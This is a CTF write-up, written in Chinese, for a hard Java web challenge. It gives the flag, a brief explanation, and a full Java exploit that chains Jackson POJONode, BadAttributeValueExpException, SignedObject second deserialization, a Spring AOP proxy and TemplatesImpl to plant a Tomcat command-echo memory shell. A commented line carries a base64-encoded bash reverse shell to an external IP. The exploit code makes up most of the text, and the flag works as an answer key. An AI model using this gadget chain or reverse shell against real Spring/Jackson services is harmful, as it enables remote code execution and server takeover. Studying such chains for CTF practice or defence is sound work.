- **题目名称：** DeserializeDeserialize
- **题目类型：** WEB
- **题目难度：** 困难
- **出题人：** Rieß
- **考点：**

1. jackon打任意getter
2. 二次反序列化

- **描述：** 初赛的那道java应该都会了吧，那就快来试一试这道吧！
- **flag：** XSCTF{Y0u_4r3_a_deserialize_m4st3r!!}
- **Writeup：** 

拿到jar包进行反编译审计，/getflag路由直接可以反序列化。查看pom.xml，发现只有spring依赖，想到利用pojonode打任意getter，但是对templatesimpl等类进行了过滤，发现可以使用signedobject二次反序列化绕过，最后templatesimpl打反弹shell或tomcatcmdecho内存马都可，payload如下：

```java
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;

public class XSFinalExp {
    public static void main(String[] args) throws Exception{
        POJONode pojoNode = new POJONode(makeTemplatesImplAopProxy());
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(11);
        setValue(badAttributeValueExpException,"val",pojoNode);

        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signature = Signature.getInstance(privateKey.getAlgorithm());
        SignedObject signedObject = new SignedObject(badAttributeValueExpException, privateKey, signature);
        POJONode pojoNode2 = new POJONode(signedObject);
        BadAttributeValueExpException badAttributeValueExpException2 = new BadAttributeValueExpException(11);
        setValue(badAttributeValueExpException2,"val",pojoNode2);

        serialize(badAttributeValueExpException2);
        //unserialize("ser.bin");
    }

    public static Object makeTemplatesImplAopProxy() throws Exception {
//        TemplatesImpl templates = TemplatesImpl.class.newInstance();
//        setValue(templates, "_bytecodes", new byte[][]{genPayload("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82MS4xMzkuNjUuMTQzLzM2NjkyIDA+JjE=}|{base64,-d}|{bash,-i}")});
//        setValue(templates, "_name", "1");
//        setValue(templates, "_tfactory", null);


        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\Java-All\\TestSpringExp\\target\\classes\\TomcatCmdEcho.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);


        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] genPayload(String cmd) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\""+cmd+"\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(49);
        return clazz.toBytecode();
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}


```
